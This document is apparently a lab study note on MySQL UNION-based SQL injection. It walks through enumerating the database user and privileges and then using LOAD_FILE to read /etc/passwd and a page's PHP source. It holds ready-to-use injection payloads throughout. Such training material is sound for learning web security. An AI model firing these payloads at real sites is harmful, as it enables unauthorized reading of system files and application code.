 ## Privileges
In `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

#### DB User
First, we have to determine which user we are within the database.
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

```sql
cn' UNION SELECT 1, current_user(), 3, 4-- -
```

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
Which tells us our current user, which in this case is `root`:

#### User Privileges
```sql
SELECT super_priv FROM mysql.user
```

Once again, we can use the following payload with the above query:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

If we had many users within the DBMS, we can add `WHERE user="root"` to only show privileges for our current user `root`:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
![[Pasted image 20251118160805.png]]

The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:
##### Other privileges
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

From here, we can add `WHERE grantee="'root'@'localhost'"` to only show our current user `root` privileges. Our payload would be:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
And we see all of the possible privileges given to our current user:
![[Pasted image 20251118160929.png]]We see that the `FILE` privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.

## LOAD_FILE
Now that we know we have enough privileges to read local system files, let us do that using the `LOAD_FILE()` function
```sql
SELECT LOAD_FILE('/etc/passwd');
```

Similar to how we have been using a `UNION` injection, we can use the above query:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
![[Pasted image 20251118161152.png]]
## Another Example
We know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting `[Ctrl + U]`.
![[Pasted image 20251118161311.png]]